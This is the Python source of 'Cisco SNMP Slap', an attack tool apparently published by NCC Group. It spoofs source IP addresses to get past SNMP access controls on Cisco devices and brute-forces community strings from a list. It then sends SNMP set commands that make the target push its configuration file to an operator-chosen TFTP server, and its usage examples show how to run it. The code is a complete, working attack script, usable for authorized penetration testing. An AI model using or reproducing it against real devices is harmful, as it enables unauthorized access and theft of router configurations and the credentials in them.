#!/usr/bin/env python
#    Cisco SNMP Slap v0.3
#    Released as open source by NCC Group Plc - http://www.nccgroup.com/
#    Developed by Darren McDonald, darren.mcdonald@nccgroup.com
#    http://www.github.com/nccgroup/

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

# TODO
# * Multi threading
# * Comments

version = "v0.3.1"

print "Cisco SNMP Slap, ", version
print "Darren McDonald, darren.mcdonald@nccgroup.com"

import sys
from scapy.all import *
import random
import os.path
import re

community = ""
tftpserver = ""
srcip = ""
dstip = ""
srcmask = ""
outpath = ""
configured = 0

def sendSNMP( l, c ):
	s1=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"),value=6)])) 
	s2=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.2.112"),value=1)])) 
	s3=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.3.112"),value=4)])) 
	s4=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.4.112"),value=1)])) 
	s5=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.5.112"),value=ASN1_IPADDRESS(tftpserver))]))
	s6=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.6.112"),value="cisco-config.txt")])) 
	s7=SNMP(community=c,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"),value=1)])) 
	send(l/s1, verbose=0)
	send(l/s2, verbose=0)
	send(l/s3, verbose=0)
	send(l/s4, verbose=0)
	send(l/s5, verbose=0)
	send(l/s6, verbose=0)
	send(l/s7, verbose=0)

def checkFile():
	if os.path.isfile(outpath) == True:
		print "Success!"
		quit()

def myQuit():
	print "waiting 10 seconds to see of the last requests cause a TFTP push"
	sleep(10)
	checkFile()
	quit()

argc = len(sys.argv)

if argc > 1:
	mode = sys.argv[1]

if argc == 6 and mode == "single_l":
	print "Community file:  ", sys.argv[2]
	filename = sys.argv[2]
	print "TFTP Server IP  :  ", sys.argv[3]
	tftpserver = sys.argv[3]
	print "Source IP:         ", sys.argv[4]
	srcip = sys.argv[4]
	print "Destination IP:    ", sys.argv[5]
	dstip = sys.argv[5]
	configured = 1
	with open( filename ) as infile:
		community = infile.readlines()
	print "community strings loaded: ", community


if argc == 6 and mode == "single":
	print "Community String:  ", sys.argv[2]
	community = sys.argv[2]
	print "TFTP Server IP  :  ", sys.argv[3]
	tftpserver = sys.argv[3]
	print "Source IP:         ", sys.argv[4]
	srcip = sys.argv[4]
	print "Destination IP:    ", sys.argv[5]
	dstip = sys.argv[5]
	configured = 1

if argc == 8 and mode == "randmask":
	print "Community String:  ", sys.argv[2]
	community = sys.argv[2]
	print "TFTP Server IP  :  ", sys.argv[3]
	tftpserver = sys.argv[3]
	print "Source IP:         ", sys.argv[4]
	srcip = sys.argv[4]
	print "Source Mask:       ", sys.argv[5]
	srcmask = sys.argv[5]
	print "Destination IP:    ", sys.argv[6]
	dstip = sys.argv[6]
	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
	print "TFTP Root Path:    ", outpath
	configured = 1

if argc == 8 and mode == "seqmask":
	print "Community String:  ", sys.argv[2]
	community = sys.argv[2]
	print "TFTP Server IP  :  ", sys.argv[3]
	tftpserver = sys.argv[3]
	print "Source IP:         ", sys.argv[4]
	srcip = sys.argv[4]
	print "Source Mask:       ", sys.argv[5]
	srcmask = sys.argv[5]
	print "Destination IP:    ", sys.argv[6]
	dstip = sys.argv[6]
	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
	print "TFTP Root Path:    ", outpath
	configured = 1


if argc == 8 and mode == "seqmask_l":
	print "Community File:    ", sys.argv[2]
	filename = sys.argv[2]
	print "TFTP Server IP  :  ", sys.argv[3]
	tftpserver = sys.argv[3]
	print "Source IP:         ", sys.argv[4]
	srcip = sys.argv[4]
	print "Source Mask:       ", sys.argv[5]
	srcmask = sys.argv[5]
	print "Destination IP:    ", sys.argv[6]
	dstip = sys.argv[6]
	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
	print "TFTP Root Path:    ", outpath
	configured = 1
	with open( filename ) as infile:
		community = infile.readlines()
	print "community strings loaded: ", community

if argc == 8 and mode == "randmask_l":
	print "Community File:    ", sys.argv[2]
	filename = sys.argv[2]
	print "TFTP Server IP  :  ", sys.argv[3]
	tftpserver = sys.argv[3]
	print "Source IP:         ", sys.argv[4]
	srcip = sys.argv[4]
	print "Source Mask:       ", sys.argv[5]
	srcmask = sys.argv[5]
	print "Destination IP:    ", sys.argv[6]
	dstip = sys.argv[6]
	outpath = sys.argv[7] + os.sep + "cisco-config.txt"
	print "TFTP Root Path:    ", outpath
	configured = 1
	with open( filename ) as infile:
		community = infile.readlines()
	print "community strings loaded: ", community

if configured == 0:
	print "Usage: ./slap.py single [community string] [TFTP Server IP] [Source IP] [Destination IP]"
	print "       ./slap.py single_l [community string file] [TFTP Server IP] [Source IP] [Destination IP]"
	print "       ./slap.py randmask [community string] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
	print "       ./slap.py seqmask [community string] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
	print "       ./slap.py randmask_l [community string file] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
	print "       ./slap.py seqmask_l [community string file] [TFTP Server IP] [Source IP] [sourcemask] [Destination IP] [TFTP Root Path]"
	print "Examples:"
	print "       ./slap.py single private 10.0.0.2 10.100.100.100 10.0.0.1"
	print "       ./slap.py randmask private 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/"
	print "       ./slap.py seqmask private 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/"
	print "       ./slap.py seqmask_l mylist.txt 10.0.0.2 10.0.0.0 0.255.255.0 10.0.0.1 /tftproot/"
	print ""
	print "All of these examples would work against a device expecting an IP address in the 10.100.100.0/24"
	print "range with a tftp server running on 10.0.0.2, against a target 10.0.0.1"
	print ""
	print "This tool does not include an TFTP server, you'll have to run one seperatly, e.g. tftpgui.py"

	quit()

if outpath != "" and os.path.isfile(outpath):
	print "Target file alreadly exists, delete or move the following file and try again"
	print outpath
	quit()

if mode == "single":
	l34=IP(src=srcip,dst=dstip)/UDP(sport=161,dport=161)
	sendSNMP( l34, community )
	quit()

if mode == "single_l":
	l34=IP(src=srcip,dst=dstip)/UDP(sport=161,dport=161)
	for c in community:
		c = c.strip()
		print dstip, "/ ", c
		sendSNMP( l34, c )
		checkFile()
	quit()
	
if mode == "randmask":
	while True:
		tmpip = srcip
                srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
                maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
		randIP = ".".join(map(str, (random.randint(0, 255)
			for _ in range(4))))
		randomLong = struct.unpack("!L", socket.inet_aton(randIP))[0]
		maskAsLong = randomLong & maskAsLong
		srcIPAsLong = srcIPAsLong ^ maskAsLong
		tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong))
		print tmpip
		l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
		sendSNMP( l34, community )
		checkFile()

if mode == "randmask_l":
	while True:
		tmpip = srcip
                srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
                maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
		randIP = ".".join(map(str, (random.randint(0, 255)
			for _ in range(4))))
		randomLong = struct.unpack("!L", socket.inet_aton(randIP))[0]
		maskAsLong = randomLong & maskAsLong
		srcIPAsLong = srcIPAsLong ^ maskAsLong
		tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong))
		l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
		for c in community:
			c = c.strip()
			print tmpip, "/ ", c
			sendSNMP(l34, c)
			checkFile()

if mode == "seqmask":
	seqIP = "0.0.0.0"
	seqLong = struct.unpack("!L", socket.inet_aton(seqIP))[0]
	tmpip = srcip
        srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
        maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
	while True:
		if seqLong | maskAsLong == maskAsLong:
			srcIPAsLong2 = srcIPAsLong ^ seqLong
			tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong2))
			print tmpip
			l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
			sendSNMP(l34, community)
			checkFile()
		if seqLong < maskAsLong:
			seqLong = seqLong + 1
		else:
			break
	checkFile()
	myQuit()

if mode == "seqmask_l":
	seqIP = "0.0.0.0"
	seqLong = struct.unpack("!L", socket.inet_aton(seqIP))[0]
	tmpip = srcip
        srcIPAsLong = struct.unpack("!L", socket.inet_aton(tmpip))[0]
        maskAsLong = struct.unpack("!L", socket.inet_aton(srcmask))[0]
	while True:
		if seqLong | maskAsLong == maskAsLong:
			srcIPAsLong2 = srcIPAsLong ^ seqLong
			tmpip = socket.inet_ntoa(struct.pack('!L', srcIPAsLong2))
			l34=IP(src=tmpip,dst=dstip)/UDP(sport=161,dport=161)
			for c in community:
				c = c.strip()
				print tmpip, "/ ", c
				sendSNMP(l34, c)
				checkFile()
		if seqLong < maskAsLong:
			seqLong = seqLong + 1
		else:
			break
	checkFile()
	myQuit()

quit()

